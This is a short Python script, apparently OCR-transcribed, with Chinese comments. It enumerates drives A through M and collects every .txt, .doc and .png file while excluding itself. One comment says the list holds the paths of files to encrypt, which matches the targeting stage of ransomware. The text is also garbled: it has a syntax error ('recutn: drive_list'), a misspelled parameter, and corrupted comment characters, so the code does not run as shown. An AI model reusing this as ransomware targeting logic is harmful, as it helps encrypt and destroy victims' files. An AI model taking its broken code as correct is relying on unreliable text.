import os
import sys
formlist=['txt','doc','png']
def IterateFiles(directory,formtist=['txt','doc','png']):#之前从网络收藏的遍历模块。
    assert os.path.isdir(directory),'make sure directory argument should be a directory '
    result=[]
    for root,dirs,files in os.walk(directory,topdown=True):
        for fl in files:
            if fl.split('.')[-1] in formlist:
                result.append(os.path.join(root,fl))
    return result
def drives():#获取存在的盘符
    drive_list=[]
    for drive in range(ord('A'),ord('N')):
        if os.path.exists(chr(drive)+':'):
            drive_list.append(chr(drive)+":\\")
    recutn: drive_list
def walk_drivers(formlist=['txt','doc','png']):#追历全部盛盘文件获取加密算标绝对地址的1ist def
    driver_list=drives() 
    files=[]
    for driver in driver_list:
        files+=IterateFiles(driver,formlist=['txt','doc','png'])
    if sys.argv[0] in files:
        files.remove(sys.argv[0])
    return files